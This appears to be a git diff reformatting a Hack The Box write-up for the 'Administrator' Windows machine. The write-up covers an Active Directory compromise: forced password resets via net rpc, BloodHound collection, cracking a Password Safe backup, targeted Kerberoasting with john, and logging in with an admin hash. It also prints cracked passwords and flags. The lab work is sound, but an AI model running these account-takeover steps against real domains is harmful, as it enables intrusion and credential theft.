@@ -2,15 +2,18 @@
 sticker: emoji//1f469-200d-1f4bb
 ---
 
+# ADMINISTRATOR
 
-# ENUMERATION
----
+## ENUMERATION
 
-## OPEN PORTS
----
+***
+
+### OPEN PORTS
+
+***
 
 | PORT     | SERVICE       |
-| :------- | :------------ |
+| -------- | ------------- |
 | 21/tcp   | ftp           |
 | 53/tcp   | domain        |
 | 88/tcp   | kerberos-sec  |
@@ -19,7 +22,7 @@ sticker: emoji//1f469-200d-1f4bb
 | 389/tcp  | ldap          |
 | 445/tcp  | microsoft-ds? |
 | 464/tcp  | kpasswd5?     |
-| 593/tcp  | ncacn_http    |
+| 593/tcp  | ncacn\_http   |
 | 636/tcp  | tcpwrapped    |
 | 3268/tcp | ldap          |
 | 3269/tcp | tcpwrapped    |
@@ -32,27 +35,25 @@ We have a windows machine, HTB give us the following credentials for initial acc
 
 Let's begin reconnaissance.
 
-# RECONNAISSANCE
----
+## RECONNAISSANCE
+
+***
 
 Since we got some credentials, let's use `evil-winrm` to log:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116163132.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116163132.png)
 
 We can use `net users` to list all the users in this machine:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116163210.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116163210.png)
 
 We can attempt to change password for these users, with `net user {user} {password_to_set}`, after trying I found I could change the password for user Michael:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116163543.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116163543.png)
 
 So, we can log using `evil-winrm` with the set credentials:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116163724.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116163724.png)
 
 Nice, we could log as `michael`, an useful step would be dumping the AD json using `bloodhound-python` to perform analysis:
 
@@ -75,37 +76,33 @@ In order to perform this command we need to add `administrator.htb` to `/etc/hos
 Now we can analyze the data, let's take a look and highlight the most important stuff.
 ```
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 After analyzing the data, we check we can use `michael` account to change the password of `benjamin`, this can be performed using `net rpc` in the following way:
-
 
 ```ad-hint
 `net rpc password "benjamin" "benjaminPasword" -U "administrator.htb"/"michael"%"password" -S "administrator.htb"`
 ```
 
-
 We can check it worked using `smbclient`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116165415.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116165415.png)
 
 Nice, let's list all available shares using `smbmap`:
 
 `smbmap -H 10.10.11.42 -u 'benjamin' -p 'benjaminPasword`
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116165547.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116165547.png)
 
 We have FTP enabled, let's use it to read files:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116165908.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116165908.png)
 
 We got a `Backup.psafe3` file, let's download it on our local machine:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116170832.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116170832.png)
 
 We need to do the following in order to be able to read the file:
 
@@ -121,36 +118,32 @@ We need to do the following in order to be able to read the file:
 We got it: `tekieromucho`
 ```
 
-
 Let's view that data, we can use `pwsafe`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116171455.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116171455.png)
 
 We got some data about three people: `alexander`, `emily`, `emma`, let's log using the password found for `emily`:
-
 
 ```ad-note
 `emily`:`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116172606.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116172606.png)
 
 Let's get our user flag and begin privilege escalation:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116173148.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116173148.png)
 
 ```ad-important
 User: `8870f70828e61d9ab29b0db1e5c1be2f`
 
 ```
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
+***
 
 `emily` has `GenerticWrite` privilege over user `ethan`, we need to follow these steps to get the Ethan `TGT` and be able to crack the password:
-
 
 ```ad-summary
 1. `sudo ntpdate administrator.htb`
@@ -167,7 +160,7 @@ In that way, we can obtain the TGT, we can crack it using john:
 `john --wordlist=/usr/share/wordlists/rockyou.txt ethan.hash`
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116181304.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116181304.png)
 
 We got Ethan password: `limpbizkit`, we can do the following in order to get the admin hash:
 
@@ -181,7 +174,7 @@ We got Ethan password: `limpbizkit`, we can do the following in order to get the
 ![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116181538.png)
 ```
 
-So, our admin hash would be: 
+So, our admin hash would be:
 
 ```ad-note
 Hash: `3dc553ce4b9fd20bd016e098d2d2fd2e`
@@ -189,9 +182,8 @@ Hash: `3dc553ce4b9fd20bd016e098d2d2fd2e`
 
 Let's log in:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250116181640.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250116181640.png)
 
 ```ad-important
 Root: `28aaa826bd73c76cf8c151cca7108e23`
 ```
-
